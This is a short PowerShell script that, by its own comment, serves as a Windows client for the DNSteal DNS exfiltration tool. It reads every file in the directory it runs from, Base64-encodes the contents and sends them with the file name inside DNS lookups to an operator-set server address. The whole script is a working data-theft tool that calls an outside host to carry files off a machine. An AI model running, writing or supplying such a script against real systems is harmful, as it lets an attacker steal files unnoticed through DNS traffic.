#Simple PS script to use DNSteal in Windows machines
$server="127.0.0.1" #DNSeatl Server IP
Get-ChildItem "." | Foreach-Object { #It works in the directory where the script is executed
    $content = Get-Content $_.FullName      
    $EncodedText =[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
    $req=$EncodedText+"-."+$_.Name 
    nslookup $req $server
    #You can use Resolve-DnsName Cmdlet
}